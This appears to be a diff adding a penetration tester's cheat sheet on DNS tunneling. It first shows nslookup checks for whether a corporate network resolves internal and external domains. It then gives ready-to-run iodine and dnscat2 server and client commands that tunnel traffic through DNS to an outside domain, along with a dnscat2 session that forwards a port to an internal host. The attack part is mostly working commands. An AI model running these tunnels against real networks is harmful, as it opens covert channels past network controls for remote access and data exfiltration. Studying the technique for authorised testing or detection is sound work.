@@ -1,0 +1,55 @@
+
+---------------------Detection---------------------
+
+# can we resolve internal domain? 
+	nslookup acmebank.local
+	Server:    192.168.1.1
+	Address:  192.168.1.1#53
+	
+	Name:  acmebank.local
+	Address: 192.168.10.12
+	
+# can we resolve an external domain through company DNS server? (if yes, we can perform DNS tunneling)
+	nslookup google.com
+	Server:    192.168.1.1
+	Address:  192.168.1.1#53
+	
+	Non-authoritative answer:
+	Address: 216.58.209.14
+	Name:  google.com
+	
+ # can we communicate with external DNS? (another finding)
+	nslookup pentest.blog 8.8.8.8
+	Server: 8.8.8.8
+	Address: 8.8.8.8#53
+	
+	Non-authoritative answer:
+	Name: pentest.blog
+	Address: 104.27.169.40
+	Name: pentest.blog
+	Address: 104.27.168.40
+
+	
+
+---------------------Attack---------------------
+Tool: iodine	
+iodine creates 2 tun adaptor and send data between these 2 adapters by tunneling like a DNS query
+
+Server Side:
+	iodined -f -c -P <pass> <IP address> <domain> 
+	eg: 
+	iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com 
+	
+Client Side:
+	iodine -f -P <pass> <domain> r 
+	eg: 
+	iodine -f -P P@ssw0rd tunneldomain.com -r 
+	
+Tool: dnscat2 	
+Server Side:
+	ruby ./dnscat2.rb tunneldomain.com 
+Client Side:
+	./dnscat2 tunneldomain.com 
+	
+	dnscat2> session -i 1
+	command session (debian) 1> listen 127.0.0.1:8080 10.0.0.20:80 
